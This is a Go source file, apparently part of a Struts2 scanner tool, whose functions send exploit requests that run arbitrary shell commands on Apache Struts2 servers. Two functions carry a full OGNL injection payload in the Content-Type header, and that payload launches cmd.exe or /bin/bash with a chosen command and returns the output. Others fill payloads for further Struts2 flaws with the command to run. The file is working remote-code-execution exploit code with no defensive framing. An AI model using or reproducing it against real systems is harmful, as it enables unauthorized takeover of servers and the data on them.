package shellCommandExecution

import (
	"Struts2Scanner/vars"
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"time"
)

func Gexp(url, poc,cmd string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	command := strings.Replace(poc, "FUZZINGCOMMAND", cmd, -1)
	curl := url + command
	req, err := http.NewRequest("GET", curl, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}

	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func Gexp045(url, cmd string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent" ,"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36")
	req.Header.Add("Accept", "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*")
	req.Header.Add("Content-Type", "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func Gexp0452(url, cmd string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent" ,"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36")
	req.Header.Add("Accept", "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*")
	req.Header.Add("Content-Type", "%{(#dm='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmd+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")

	reqs, err := client.Do(req)
	if err != nil {
		return "",err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func Gexp053(url, cmd string, header map[string]string) (string,error) {
	fmt.Println("请为struts2-053指定参数：")
	reader := bufio.NewReader(os.Stdin)
	param, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}

	command := strings.Replace(vars.Shell["struts2-053"], "FUZZINGCOMMAND", cmd, -1)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}

	req, err := http.NewRequest("GET", url+"?"+param+"="+command, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer reqs.Body.Close()
	body, _ := ioutil.ReadAll(reqs.Body)
	return string(body), nil
}

func Gexp057(urll, cmd, poc string, header map[string]string) (string,error) {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	cookieJar, _ := cookiejar.New(nil)
	var client = &http.Client{
		Timeout: time.Second * 5,
		Jar: cookieJar,
		Transport: tr,
	}
	commad := strings.Replace(vars.Shell[poc], "FUZZINGCOMMAND", cmd, -1)
	surl,_ := url.Parse(urll)
	rul := strings.Replace(urll, surl.Path, "", -1) + commad + surl.Path

	req, err := http.NewRequest("GET", rul, nil)
	if err != nil {
		return "", err
	}
	req.Header.Add("User-Agent", header["User-Agent"])
	req.Header.Add("Accept", header["Accept"])
	req.Header.Add("Content-Type", header["Content-Type"])

	reqs, err := client.Do(req)
	if err != nil {
		return "", err
	}
	body, _ := ioutil.ReadAll(reqs.Body)
	defer reqs.Body.Close()
	return string(body), nil
}

